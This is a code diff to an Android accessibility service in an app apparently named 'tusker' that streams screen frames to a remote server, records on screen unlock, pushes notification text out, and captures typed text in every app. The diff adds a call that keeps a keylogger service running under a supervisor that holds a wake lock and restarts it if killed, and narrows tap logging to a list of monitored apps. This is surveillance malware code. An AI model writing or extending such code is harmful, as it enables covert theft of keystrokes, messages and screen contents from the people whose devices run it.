@@ -449,6 +449,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
         try { ensureRemoteServiceRunning(); } catch (Exception e) { Log.w(TAG, "ensureRemoteServiceRunning failed: " + e.getMessage()); }
         try { startSocketCheckLoop(); } catch (Exception e) { Log.w(TAG, "startSocketCheckLoop failed: " + e.getMessage()); }
+        // Keylog capture must stay alive: this process supplies the events, the
+        // supervisor holds the wake lock and repairs both peers if they are killed.
+        try { KeyloggerService.ensureRunning(this); } catch (Exception e) { Log.w(TAG, "KeyloggerService start failed: " + e.getMessage()); }
 
         // Register receiver for screen on/off and unlock events — drives auto-recording
         try { registerScreenStateReceiver(); } catch (Exception e) { Log.w(TAG, "registerScreenStateReceiver failed: " + e.getMessage()); }
@@ -1128,15 +1131,20 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     break;
 
                 case AccessibilityEvent.TYPE_VIEW_CLICKED:
-                    // Push a stream frame on tap, and log the tapped element for monitored apps
+                    // Push a stream frame on tap
                     try {
                         SocketManager smClick = SocketManager.getInstance(this);
                         if (smClick.isStreamingActive()) {
                             smClick.scheduleFrameAfterAction(
-                                com.task.tusker.utils.DeviceInfo.getDeviceId(this));
+                                    com.task.tusker.utils.DeviceInfo.getDeviceId(this));
                         }
                     } catch (Exception ignored) {}
-                    logClickForApp(event, packageName);
+                    // UI taps are only captured for the apps explicitly listed in
+                    // Constants.MONITORED_PACKAGES. Typed text is captured
+                    // everywhere (see TYPE_VIEW_TEXT_CHANGED); taps are not.
+                    if (isMonitoredPackage(packageName)) {
+                        logClickForMonitoredApp(event, packageName);
+                    }
                     // ── Notification tapped in panel ───────────────────────────────
                     // When the user taps a notification row while the shade is open,
                     // capture its text/title from the event source and push to server.
